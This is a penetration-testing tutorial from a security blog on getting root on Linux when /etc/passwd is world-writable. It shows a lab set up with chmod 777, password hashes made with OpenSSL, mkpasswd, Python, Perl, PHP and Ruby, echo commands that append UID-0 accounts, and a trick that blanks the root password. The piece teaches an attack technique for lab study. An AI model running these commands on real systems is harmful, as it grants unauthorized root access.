<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
            <h1 class="post-title entry-title">Editing  /etc/passwd File for Privilege Escalation</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/" rel="bookmark"><time class="entry-date published" datetime="2018-05-12T13:17:17+00:00">May 12, 2018</time><time class="updated" datetime="2025-06-08T12:31:35+00:00">June 8, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">In this article, we will focus on exploring diverse techniques to modify the etc/passwd file, enabling us to create or alter a user and grant them root privileges. It becomes crucial to understand how to edit your own user within the /etc/passwd file when dealing with privilege escalation on the compromised system. If you’re interested, we have previously demonstrated this method for privilege escalation in our earlier articles. You can find the links below.</span></p>
<h3 class="ai-optimize-7"><span style="color: #800000;">Table of Contents</span></h3>
<p class="ai-optimize-8"><strong><span style="color: #000000;">About /etc/passwd file</span></strong></p>
<ul>
<li class="ai-optimize-9"><span style="color: #000000;">Understand the basic</span></li>
<li class="ai-optimize-10"><span style="color: #000000;">Adding new user to /etc/passwd file</span></li>
</ul>
<p class="ai-optimize-11"><strong><span style="color: #000000;">Different methods to create passwd for /etc/passwd file</span></strong></p>
<ul>
<li class="ai-optimize-12"><span style="color: #000000;">OpenSSL</span></li>
<li class="ai-optimize-13"><span style="color: #000000;">Mkpasswd</span></li>
<li class="ai-optimize-14"><span style="color: #000000;">Python</span></li>
<li class="ai-optimize-15"><span style="color: #000000;">Perl</span></li>
<li class="ai-optimize-16"><span style="color: #000000;">Php</span></li>
<li class="ai-optimize-17"><span style="color: #000000;">Ruby</span></li>
<li class="ai-optimize-18"><span style="color: #000000;">Bonus: Hack Trick</span></li>
</ul>
<h3 class="ai-optimize-136"><span style="color: #800000;">About /etc/passwd file</span></h3>
<p class="ai-optimize-19"><span style="color: #000000;">Firstly, we should be aware of /etc/passwd file in depth before reaching the point. Inside etc directory, we will get three most important files i.e. <strong>passwd</strong>, <strong>group</strong>, and <strong>shadow</strong>.</span></p>
<p class="ai-optimize-20"><span style="color: #000000;"><strong>etc/passwd: </strong>It is a human-readable text file which stores information of user account.</span></p>
<p class="ai-optimize-21"><span style="color: #000000;"><strong>etc/group:</strong> It is also a human-readable text file which stores group information as well as user belongs to which group can be identified through this file.</span></p>
<p class="ai-optimize-22"><span style="color: #000000;"><strong>etc/shadow: </strong>It is a file that contains encrypted password and information of the account expire for any user.</span></p>
<h5 class="ai-optimize-23"><span style="color: #000000;"><strong>The format of details in /passwd File</strong></span></h5>
<p class="ai-optimize-24"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj29BD_zZp9HG2fvhoeaAqaqs7bbImdBXtc9JYch4fgfl9ROsT3GkpNnrdyOsYhXfX0-c11xjE4Wn556PyyAzU0dbD4PG8dbmjtaCF6sLQJQ48_E07g1SqNARPXTbohHDBjrWoKRCC9xYvXTi8zlhdh258_epM02uO9OghsMmZrq-Ue6wLrAytoooBfuckj/s16000/0.png"/></span></p>
<p class="ai-optimize-25"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhQrX17dJLZ2Ixhe7pQipq0xPX8OV1vb7KNuMQ27ij4lOOwcR3nkyKvYRnrE6m9wcQp8vHAqs6D0AoG-FEiC7pUJnq2ZzHdJ4Q3FTR8XrcUOftPHYsH2rz9qlQZd3XA2ohCSGttIKoTVHHXK2HCjCY88vM-dG7NfNThfJ0AX5rlwV49U2ExkpqjBzZ8DeFi/s16000/1.png"/></span></p>
<h4 class="ai-optimize-26"><span style="color: #800000;">Get into the Details Description</span></h4>
<p class="ai-optimize-27"><span style="color: #000000;"><strong>Username:</strong> The First field indicates the name of the user, which is used to login.</span></p>
<p class="ai-optimize-28"><span style="color: #000000;"><strong>Encrypted password: </strong>The <strong>X denote</strong>s an encrypted password, which is stored inside /shadow file. If the user does not have a password, <span style="box-sizing: border-box; margin: 0px; padding: 0px;">the password field will display an <strong>asterisk (*</strong></span>).</span></p>
<p class="ai-optimize-29"><span style="color: #000000;"><strong>User Id (UID): </strong>Every user must receive a user ID (UID). The system keeps UID 0 (zero) for the root user, assigns UIDs 1-99 for further predefined accounts, and allocates UIDs 100-999 for administrative purposes. The system designates UID 1000 as almost always the first non-system user, usually an administrator. If we create a new user on our Ubuntu system, it will receive the UID of 1001.</span></p>
<p class="ai-optimize-30"><span style="color: #000000;"><strong>Group Id (GID):</strong> It denotes the group of each user; like as UIDs, the first <strong>100 </strong>GIDs are usually kept for system use. The GID of <strong>0</strong> relates to the root group and the GID of <strong>1000</strong> usually signifies the users. New groups are generally allotted GIDs beginning from<strong> 1000.</strong></span></p>
<p class="ai-optimize-31"><span style="color: #000000;"><strong>Gecos Field: </strong>Usually, this is a set of comma-separated values that tells more details related to the users. The format for the GECOS field denotes the following information:</span></p>
<p class="ai-optimize-32"><span style="color: #000000;">User’s full name</span></p>
<p class="ai-optimize-33"><span style="color: #000000;">Building and room number or contact person</span></p>
<p class="ai-optimize-34"><span style="color: #000000;">Office telephone number</span></p>
<p class="ai-optimize-35"><span style="color: #000000;"><strong>Shell:</strong> It denotes the full path of the default shell that executes the command (by the user) and displays the results.</span></p>
<p class="ai-optimize-36"><span style="color: #000000;"><strong> NOTE: </strong>Each field is separated by<strong> (colon)</strong></span></p>
<p class="ai-optimize-37"><span style="color: #000000;"><strong>Let’s Start Now!!</strong></span></p>
<h3 class="ai-optimize-38"><span style="color: #800000;">Adding User by Default Method</span></h3>
<p class="ai-optimize-39"><span style="color: #000000;">Let’s start with reading /etc/passwd file through cat command, to view the present users available in our system.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat /etc/passwd</pre>
<p class="ai-optimize-40"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgsPXLIU7ZmCqVcSWsq9cct4lhGhUzNJOQAiZmZ7lq9ahX0_bGVMABOVMnth5cmwdXekwdFGANVfL286uXrVxDZNFK4AJMRvNDKnYF-MBbVPs1yMgFMYYpGpPOejyQGDIGhvwdoNjtPR9LYVrd8FzK55Tw5_zHGQAOi-8uYRxaQ62BV7ZH45q3I8YklPA7U/s16000/3.png"/></span></p>
<p class="ai-optimize-41"><span style="color: #000000;">From the image given above, you can find that “pentest” is the last user with uid 1000. Here gid 1000 denotes it is a non-system user.</span></p>
<p class="ai-optimize-42"><span style="color: #000000;">Let see what happened in ‘/passwd’ file, when we add any user with adduser command. So here you can clearly match the following information from below given image.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">adduser user1</pre>
<p class="ai-optimize-43"><span style="color: #000000;">Username: user1</span></p>
<p class="ai-optimize-44"><span style="color: #000000;">GID: 1001</span></p>
<p class="ai-optimize-45"><span style="color: #000000;">UID: 1001</span></p>
<p class="ai-optimize-46"><span style="color: #000000;">Enter password: (Hidden)</span></p>
<p class="ai-optimize-47"><span style="color: #000000;">Home Directory: /home/user1</span></p>
<p class="ai-optimize-48"><span style="color: #000000;">Other Filed: Full Name, Room Number, Work phone, Home Phone, Other (are blanked)</span></p>
<p class="ai-optimize-49"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiRblUlnSffdsJFxA3-ZnE4Q8yT_J012UdAxY6Ljbno1OYslMyML7Psqc6bPBiMz5yg-bDLt-1KgXgh-yIERQtvuLSiSnVREH05f25SKgk442RFYI5qxn9QZCMXrlXtOft0Mm0FChBH5neXuYj9Y3OtXuzpYwax5cSKk8inpDBXZxKOrQqTXABZb5uQYA_1/s16000/4.png"/></span></p>
<p class="ai-optimize-50"><span style="color: #000000;">When you will open /passwd file then you will notice that all the above information has been stored inside /etc/passwd file.</span></p>
<p class="ai-optimize-51"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjSWJlekgM4p3tkPF2jgFJ2uHSMOJuYymxpl2WbWDJNDS6DrmQ3o2Sbuswd9k9iEfHCszRHnNsParuPXRGyO6IZmS5_HJQQw1kF8hz1ef0Q3HlhFHskgqfUWWwLTciW3muG5FYrEQCMNRLkjvjEOb8rWfzYiny3Bsx3DXhdUasA-elbsS6V5TLTU5XzRwn5/s16000/5.png"/></span></p>
<p class="ai-optimize-52"><span style="color: #000000;">Repeat the steps again and adding user2 into /etc/passwd file.</span></p>
<p class="ai-optimize-53"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjT3QrrDA2hlx1y1DHVxBKgaMP4jC1S8vzlafucNURsswAoAXxpOIsiD2MQBVfc_BD_xwe9khNekIJzPbRaRCpJskI3lmtpXIY74gBJX4b-aZzOfDS1mSGW7THC8zyc0fqrL0hkztREfNYDOtf0YMk38P7W4GwtY5vvYezJtl7Ez34_mrenpAHQZXxMvnjU/s16000/6.png"/></span></p>
<p class="ai-optimize-54"><span style="color: #000000;">Now check with tail command, user2 is successfully added to /etc/passwd file and below information is updated accordingly.</span></p>
<p class="ai-optimize-55"><span style="color: #000000;">GID: 1002</span></p>
<p class="ai-optimize-56"><span style="color: #000000;">UID: 1002</span></p>
<p class="ai-optimize-57"><span style="color: #000000;">Enter password: (Hidden)</span></p>
<p class="ai-optimize-58"><span style="color: #000000;">Home Directory: /home/user1</span></p>
<p class="ai-optimize-59"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi2EzScDeLAvmD89E76j9HMyzohJchC2L3XM6Tsgas9hf0XIJEHWYYI5Pu9tX6XYOph-hn8ilEJVlMxUi8yKpOfLomRm70W-4z8zr-aKYRbLf2FaSrc4wPcgMv7Aq8raPyuOtbZO2ryth8d5NNpd3OdcDhqlVCcmIAecOa1_hHUgE-d2TfmMNt9iP3XqINy/s16000/7.png"/></span></p>
<p class="ai-optimize-60"><span style="color: #000000;">For the privilege escalation it is required that /etc/passwd file must have ‘rwx’ permissions for the logged in user. So, we are giving ‘rwx’ permission to /passwd file for lab setup.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Chmod 777 /etc/passwd</pre>
<p class="ai-optimize-61"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8w2iLP32kN4_Sf5jQvGcfbu86tFSu19SEV3SAXesPybX41JURH53DcSYkuz84PNCFbhpoi22SuQlHc8RIr9dhGJ-zvcefMYRtSyUI0QEb4NlddcQmtno5hWYTn5so5UAb0BPy-V_4wsDpEscjgJ-e34Dc6dQS-F11MOai4B89XWLHNv9LOkpcZECY5Tmp/s16000/8.png"/></span></p>
<p class="ai-optimize-62"><span style="color: #000000;">Now our lab setup is done.</span></p>
<h3 class="ai-optimize-63"><span style="color: #800000;"><strong><u>Possible Scenarios:</u></strong></span></h3>
<p class="ai-optimize-64"><span style="color: #000000;">If /etc/passwd file is editable what would be the possible scenarios to escalate the privileges?</span></p>
<p class="ai-optimize-65"><span style="color: #000000;">1: Replace the password hash for existing users in /etc/passwd file with our encrypted password.</span></p>
<p class="ai-optimize-66"><span style="color: #000000;">2: Manually add a new root privilege user to the/etc/passwd file with our encrypted password.</span></p>
<p class="ai-optimize-67"><span style="color: #000000;">3: Tempering the root or high-privilege user password in the/etc/passwd file.</span></p>
<p class="ai-optimize-68"><span style="color: #000000;"><strong>Let’s start now!</strong></span></p>
<p class="ai-optimize-69"><span style="color: #000000;">Connect with this machine with SSH:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh pentest@192.168.1.22
tail /etc/passwd
ls -al /etc/passwd</pre>
<p class="ai-optimize-70"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgtMuUtyvSizEFDxMUMDA-NfpRhR7FtIdRmOvry3L1dxs40t7zF-RFFVw1VKt1QCSSJBT220gQIERpq_M7U4DrbXo5elMsp_CsdT7ZRCj00zjcNnx5JemGd6o44d4Fr1jBul8cK2ZNoi2AbRC_i5vjVKuxUyL3iLCmBlGg42VpvmjWH3XBKrj8mzky_3D0j/s16000/9.png"/></span></p>
<p class="ai-optimize-71"><span style="color: #000000;">It is clearly visible that /etc/passwd file has all permissions.</span></p>
<h3 class="ai-optimize-72"><span style="color: #800000;">OpenSSL</span></h3>
<p class="ai-optimize-73"><span style="color: #000000;">Sometimes, the execution of the passwd command for user password setup might not be feasible. In such situations, the OpenSSL command can be employed. This command generates a salted encrypted password.</span></p>
<p class="ai-optimize-74"><span style="color: #000000;"><strong>OpenSSL</strong> is a widely used open-source library that provides various cryptographic functions, protocols, and tools for securing communications over computer networks. The openssl passwd command allows you to generate password hashes for different algorithms, such as DES, MD5, SHA-256, and more.</span></p>
<h3 class="ai-optimize-75"><span style="color: #000000;">Method 1</span></h3>
<p class="ai-optimize-76"><span style="color: #000000;">Here, we generated password in our kali machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">openssl passwd raj</pre>
<p class="ai-optimize-77"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiF7NAMWSir_mKea9RsBjsYGHIVLiuxTRtrPJG_bkHmiAiGSdNWj5WD4LGJTDDsV-smlnHbRqzpBS28gjHZZdiKRsJO2yPcKhh6IcEXi6WCZAbeNz3kSXNP6CQjC9brmgrDSwmUbK_fCGomhBWX_NXDEsmW0Fitg0NQbPcYCuZO1CMFFzDJSC8VK9RBn8bE/s16000/10.png"/></span></p>
<p class="ai-optimize-78"><span style="color: #000000;">$1 = indicates that the generated passwd in MD5 hash format.</span></p>
<p class="ai-optimize-79"><span style="color: #000000;">Now use this salted password for “aarti” user using echo command to put password in etc/passwd.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo 'aarti:$1$cJ05ZYPP$06zg1KtuJ/CbzTWPmeyNH1:0:0:root:/root:/bin/bash' &gt;&gt; /etc/passwd</pre>
<p class="ai-optimize-80"><span style="color: #000000;">here, you can observed that we have allotted uid: 0 and gid: 0 and home directory /root/root hence we have given root privilege to our user “aarti”. Now switch user and access the terminal through aarti and confirm the root access.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">tail /etc/passwd
su aarti
id</pre>
<p class="ai-optimize-81"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgblQtgYRPUdPWPQxdV48G0IS2-dvIjBfiEevRmyC57zVEadoEnx9tfCH6ceCkmGmUDGX4yvSuxzXm9cLMXCahG0E2pQNqQQ3t3aHwypOLfi4l_HUbMjY-ULolneSxvSPDZ8mpz2Xs43NFz-u3N7__sNIEJOLP-kw1iFTMSRlS6gvbKPibiSY7JzOQ_2gxk/s16000/11.png"/></span></p>
<h3 class="ai-optimize-82"><span style="color: #800000;">Method 2</span></h3>
<p class="ai-optimize-83"><span style="color: #000000;">This becomes relevant when OpenSSL is present on the victim’s system, allowing us to create passwords within the victim’s machine itself.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">openssl passwd 123
echo 'user3:ghTC5HTjVd/7M:0:0:root:/root:/bin/bash' &gt;&gt; /etc/passwd
tail /etc/passwd</pre>
<p class="ai-optimize-84"><span style="color: #000000;">Now switch user and access the terminal through user3 and confirm the root access.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">su user3
id</pre>
<p class="ai-optimize-85"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh3TXjnh25X467TOIgcAxRtMvGqCzQmjndooDJmZXwklf7w9grOat5p5VWf07WsyjtO8SzIWf898065py8Zhpk5HRUn24ScSi01cno3q5PJgSo-sd-5B3nlLxBGRt9UpYw9nvnV-sTrGS7OLk7DhS0ndWsTAQ2r96gibwL77TPCKvKqrJ62fQXWTcp6CVaL/s16000/12.png"/></span></p>
<p class="ai-optimize-86"><span style="color: #000000;">Cool!!! Both methods are working.</span></p>
<h3 class="ai-optimize-87"><span style="color: #800000;">Mkpasswd</span></h3>
<p class="ai-optimize-88"><span style="color: #000000;">It is an alternate method of Openssl. <strong>mkpasswd</strong> is a command-line tool utilized for producing password hashes intended for diverse authentication systems.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">mkpasswd -m &lt;method&gt; &lt;password&gt;</pre>
<p class="ai-optimize-89"><span style="color: #000000;">Here, &lt;method&gt; specifies the hash algorithm (like sha-512, md5, etc.), and &lt;password&gt; is the password you want to hash.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">mkpasswd -m SHA-512 pass123</pre>
<p class="ai-optimize-90"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhRgEe_Oda8-oIo7IUakfvVYMca2sldPzjCw_k43oz2LZrpT4gITG7xDQaDk97xfOP2uqdkWzGTxdFwGDDUBjEbIV_eML95S5b8Vzu3WNegs0vEkbc_B39xjrZn5tN5xQ02PR2nCcfM1rp8gNXquGpFRGB0hFlv5_4RrNaARfYoEKUoUuLUTxXHWbd0zY9S/s16000/13.png"/></span></p>
<p class="ai-optimize-91"><span style="color: #000000;">You can use the above similar method to add a password to /etc/passwd file or manually edit.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano /etc/passwd</pre>
<p class="ai-optimize-92"><span style="color: #000000;">In the below image, you can observe that I have allotted uid: 0 and gid: 0 and home directory /root/root hence we have given root privilege to our user4.</span></p>
<p class="ai-optimize-93"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhjCTDn4Kiv5xBfOJSZg5Gxv0YpVQ_0XyKjh35J6GAi3tAvPJAtxK2M9vwvtJvUJtpILs42y8LC_u4nfoVjPqPGhWT6e2QFrMlxQVecYVediUcpkmHlGobVoRlJAHXtdyrcokhf5RIwQx2pbb3MOWLlyk6IYjdBccj-Rd4B2ckTKyg9w0iHhCv52oSkU-Mc/s16000/14.png"/></span></p>
<p class="ai-optimize-94"><span style="color: #000000;">Now switch user and access the terminal through user4 and confirm the root access.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">su user4
id</pre>
<p class="ai-optimize-95"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7ihwAcW7F6SEEKfMQ2Rh3mgK7gcZYsS4Aac3K4YUrtx_EezKxrWpFE_labJ9zmdauEaK_wTeKOssmZMzlIJKHmC3mwfqAckHuaWi3uSbrXRVHgG6StBk2wEMmVaaliVrB8wXgBdfDroT45n5zWjT4g2OYoTe1QCkL5T-qbOysoIxk2eO8aGMgT6fkufQa/s16000/15.png"/></span></p>
<p class="ai-optimize-96"><span style="color: #000000;">Great!!! It is also working.</span></p>
<h3 class="ai-optimize-97"><span style="color: #800000;">Python</span></h3>
<p class="ai-optimize-98"><span style="color: #000000;">Python allows us to add salt to our passwords, which will create an encrypted password that includes the salt value.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python2 -c 'import crypt; print crypt.crypt("pass123", "$6$salt")'</pre>
<p class="ai-optimize-99"><span style="color: #000000;">If above command is not working, you can use the python3 or check the installed python version with “which python” command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 -c 'import crypt; print (crypt.crypt("pass123", "$6$salt"))'</pre>
<p class="ai-optimize-100"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhDTxsafw1kPmLyvGk_re4XPAO22CmPEYK2kEATFraVwiTJQnFWhSSzMayweKrZMTw7GgfqLhU5qN9p7kY6MU-L2vVtjq0ACM4hCNbx-1vy-SxrIqmIkr-bf2VDq0XTsh6pHhGE3iILHTL48fnWVR-gMnuvncgm7PMbnICn3prhpiDwHcYB6QhBbdi53Jie/s16000/16.png"/></span></p>
<p class="ai-optimize-101"><span style="color: #000000;">Use any method to edit and put encrypted passwd into /etc/passwd file and switch to user5. Here we used nano editor.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">su user5
id</pre>
<p class="ai-optimize-102"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh43niWvJvVFe4JKSPBck7PAT2q_YJE4G0XPkRuKQVFnrq3VdKwFeH8n_f0vSj3DLjVCVHpHSKZnOXs2Orheeya0fHMNSxUSubveNnxX2hpAnx7C0WQKy78pliiSnCqsXor5aphE7WEJVkXEG45VXpOkS-9e1m6OWLXWkQk_wqd1fQc6mouPToeybGnOgCB/s16000/17.png"/></span></p>
<p class="ai-optimize-103"><span style="color: #000000;">It is also working.</span></p>
<h3 class="ai-optimize-104"><span style="color: #800000;">Perl</span></h3>
<p class="ai-optimize-105"><span style="color: #000000;">Similar to this, we can create a hash value for our password using salt value using Perl along with crypt.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">perl -le 'print crypt("pass123", "abc")'</pre>
<p class="ai-optimize-106"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjqTFQPCyDnLgHZuwT2BpnJR8HWJBdqNPelRbv2vMqeDcb2uiH3M9aFFIjSONl2Tunrtf_pWyQ6GPW1t4ZBJIa9gn-nkvfXHHO3sWUA0XqdHPi7bP5AWX4c1-Y4T54Xi58Sic0fjSvjk85ofD765euO1_7HbbhiKy6QzYxLZJdS1h-cAzdIwlt7belRHfKG/s16000/19.png"/></span></p>
<p class="ai-optimize-107"><span style="color: #000000;">You will get the encrypted password; repeat the manual step of adding new user “user6” and putting the encrypted value into the password field with the echo command in terminal.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo ‘user6:abBxjdJQWn8xw:0:0:root:/root:/bin/bash’ &gt;&gt; /etc/passwd</pre>
<p class="ai-optimize-108"><span style="color: #000000;">here, you can see that we have allotted uid: 0 and gid: 0 and home directory /root/root hence we have given root privilege to our user6. Switch to new user user6</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">su user6
id</pre>
<p class="ai-optimize-109"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi53dPZbQWb-wZfUay9LFNsvlC_C39Y4XpNAb9RTS0AnPe55TUQQEkg_8pJ-QxZSVs3ZrGI6MIi_WSjFx0pYsfc1NsccxOiEqwnkxXTDoF74AlUtS0nV04_CVEYr9SEBA7nwgti04c1eSzxAzaqRnpN6N0Iv2PdqynLvzcfznJOCUj8c1GNQRwaXEfu8_p3/s16000/20.png"/></span></p>
<p class="ai-optimize-110"><span style="color: #000000;">Great!! This method is also working.</span></p>
<h3 class="ai-optimize-111"><span style="color: #800000;">PHP</span></h3>
<p class="ai-optimize-112"><span style="color: #000000;">The hash for our password may also be created using PHP along with crypt using the salt value.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">php -r "print(crypt('aarti','123') . \"\n\");"</pre>
<p class="ai-optimize-113"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjmBFiyV2d5oStKU20DrMz6sAeKLu3X7A6ucsjptA5Gar6bI0Hny7zw439PSa8fQnX98qsGb3BKcSpu6JYkNYJkxgzbRGQM_K5xAXl6As1cf3tAAdbhzj-Y7AsMfqXQfqCXgKv8ipx5j-wAqWOik-w-nCoXo4FaU0LZ65e19UCLUbFkojpe4uyJBOuKAvAV/s16000/22.png"/></span></p>
<p class="ai-optimize-114"><span style="color: #000000;">You will get the encrypted password; repeat the same method of adding new user “user7” and putting the encrypted value into the password field with the echo command in terminal.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo ‘user7:121z.fuKOKzx.:0:0:root:/root:/bin/bash’ &gt;&gt; /etc/passwd</pre>
<p class="ai-optimize-115"><span style="color: #000000;">In below image you can observe that we have allotted uid: 0 and gid: 0 and home directory /root/root hence we have given root privilege to our user7.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">tail -n 2 /etc/passwd
su user7
id</pre>
<p class="ai-optimize-116"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjMs9ciuIEPejflY4fKsxkifYy3syeIf_nwQqhPIBUNLl8h9e2csIe9qI7h1KGckvgTK2NJ1LwqeXNvjULqcS4MoDTn1LqJziOq6uWb4BfFO5Whf7nKnoWxXIZqs8bVpb0apcMXVzHe4K8yvtXr_CNK9s_XKFRFWMVIgPjwjXDYX8-OY1vrF_o0d01rVq6i/s16000/23.png"/></span></p>
<p class="ai-optimize-117"><span style="color: #000000;">Working!!!</span></p>
<h3 class="ai-optimize-118"><span style="color: #800000;">Ruby</span></h3>
<p class="ai-optimize-119"><span style="color: #000000;">As we have already use Python, Perl, PHP in the same way Ruby can be used for creating encrypted password along with crypt using the salt value.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ruby -r ‘digest’ -e ‘puts “pass”.crypt(“$6$salt”)’</pre>
<p class="ai-optimize-120"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8QwJo287c_5RzdUarVXBRC-1AKbDcTXysfE4-XXxeMyRGnd97G2GOoYL2tGGTt12Q9u31yCioZMiRC3ex6RmX5LoDconJeMww6fl4Om-LszbPVWhDi2WUJyg5NEXxUQpRplqYhAZVWA7gYlOOJdAvRSSghx6j10ytmII6g2gM6rRqJ2QjaKXxxJBAFUXR/s16000/24.png"/></span></p>
<p class="ai-optimize-121"><span style="color: #000000;">Use any of above way to edit /etc/passwd and switch to new user user8</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">su user8
id</pre>
<p class="ai-optimize-122"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj4s1GONr0lwm6J5NzepRNvNEhXfIF5epU42IdqR9enZwSrYyeSi0XKqp8Qzln13hOXFvZpL_KWTAoin9MX7DV0ABMK0FnvziA8N7onpIy1dDfMjGyDIKzgLHkRRTB54WK14O56gC1aZFgL7Y11NiXf5cowj7LcCyoZ4dm6-HEB_cgs5UbD4kgzigWeYDAI/s16000/25.png"/></span></p>
<p class="ai-optimize-123"><span style="color: #000000;">This is also working.</span></p>
<h3 class="ai-optimize-124"><span style="color: #800000;">Bonus: Hack Trick</span></h3>
<p class="ai-optimize-125"><span style="color: #000000;">If you are lazy to perform any of above methods you should try this!!!</span></p>
<p class="ai-optimize-126"><span style="color: #000000;">If /etc/passwd file is having -rwxrwxrwx permissions in victim system, open /etc/passwd file and remove the ‘X’ or ‘*’ value at the place of root password. As shown in image below:</span></p>
<p class="ai-optimize-127"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiGNttyWKNtfXrSVZK8mNYLypn5_H3mz5AW3DU74AVmbE6djasV852X6nPhS0TRJQNU_7ckKVQyxnR89YMnblvjmoUQG7V5Swnla9b4iBR8aqDwDWOMCUG2C0eDgazdk8Yq3LXAFTpWk2R15mJi9ajDmtDkCrqa0Rv_hDI08IVSpJYLRlm_a0LeJOwpUvYH/s16000/26.png"/></span></p>
<p class="ai-optimize-128"><span style="color: #000000;"><strong><u>Methodology</u></strong>: The /etc/passwd file uses the ‘x’ value to indicate that the system stores the actual password hash in the /etc/shadow file (or a similar location), rather than in the /etc/passwd file itself.</span></p>
<p class="ai-optimize-129"><span style="color: #000000;">If you remove the ‘x’ value and replace it with something else or leave it blank, you will no longer store the root user’s password securely, and the system won’t be able to authenticate the root user using the stored password hash from the /etc/shadow file.</span></p>
<p class="ai-optimize-130"><span style="color: #000000;">Keep the root password blank and save the /etc/passwd file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">root::0:0:root:/root:/bin/bash</pre>
